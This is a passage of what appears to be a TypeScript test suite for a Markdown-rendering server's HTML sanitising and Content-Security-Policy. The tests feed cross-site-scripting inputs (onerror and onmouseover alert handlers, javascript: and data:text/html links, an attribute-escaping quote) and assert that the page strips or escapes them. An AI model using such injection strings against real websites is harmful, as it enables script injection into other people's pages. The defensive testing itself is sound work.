    const html = await (await fetch(harness.url + "/")).text();
    // The operator's part of the page only: the shell's own script sits after it.
    const body = html.slice(
      html.indexOf('class="narrow prose"'),
      html.indexOf("</main>"),
    );

    assert.doesNotMatch(body, /<script/i, "a script in the file is gone");
    assert.doesNotMatch(body, /evil\.example/, "and so is what it was going to do");
    assert.doesNotMatch(body, /onerror/i);
    assert.doesNotMatch(body, /<iframe/i);
    assert.doesNotMatch(body, /javascript:/i);

    // The HTML that cannot execute is left exactly as it was written.
    assert.match(body, /<p>but the prose survives<\/p>/);
    assert.match(body, /<details><summary>and so does <b>this<\/b><\/summary>kept<\/details>/);
    assert.match(body, /<img src="x">/, "the element stays, the handler does not");
    assert.match(body, /a link/, "the link's words stay, the scheme does not");
  });

  it("cannot get out of an attribute, or in through an alt", async () => {
    await write(
      [
        "# Ours",
        "",
        '[a](<https://a" onmouseover="alert(1)>)',
        "",
        "![<img src=x onerror=alert(1)>](https://pictures.example/a.png)",
        "",
        "![<img src=x onerror=alert(1)>](javascript:alert(1))",
        "",
        "[data](data:text/html,<b>hi</b>)",
        "",
        '<a href="data:text/html,hello">raw data</a>',
      ].join("\n"),
    );
    const body = (await (await fetch(harness.url + "/")).text()).slice(0, -1);

    // A quote in a URL or a title is escaped, so what looks like an attribute
    // stays inside the one it was written in rather than becoming one.
    assert.doesNotMatch(body, /onmouseover="/);
    assert.match(body, /href="https:\/\/a&quot; onmouseover=&quot;alert\(1\)"/);
    // Alt text is text, on the branch that keeps the image and the one that
    // drops it: neither may put an element on the page.
    assert.doesNotMatch(body, /<img src=x/);
    assert.match(body, /alt="&lt;img src=x onerror=alert\(1\)&gt;"/);
    // data:text/html is a document of somebody else's, under its own policy
    // rather than this page's, so nothing navigates to one.
    assert.doesNotMatch(body, /href="data:/);
  });

  it("titles the page from the document, not from a line that looks like one", async () => {
    await write(
      "```\n# Not the title\n```\n\nThe **real** title\n==================\n",
    );
    const html = await (await fetch(harness.url + "/")).text();

    assert.match(html, /<title>The real title<\/title>/);
  });

  it("could not run one anyway, since the policy names only this server's", async () => {
    await write("# Ours\n\n<script>alert(1)</script>\n");
    const response = await fetch(harness.url + "/");
    const policy = response.headers.get("content-security-policy") ?? "";
    const nonce = /<script nonce="([^"]+)"/.exec(await response.text())?.[1];

    assert.ok(nonce !== undefined);
    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
    // Somebody else's page may show somebody else's pictures, which is not the
    // same freedom as running somebody else's code.
    assert.match(policy, /img-src \* data:/);
  });

  it("refuses to start when the file was never there", async () => {
    const { customIndex } = await import("../src/markdown.ts");
    await assert.rejects(customIndex(join(dir, "absent.md")).warm());
  });
});
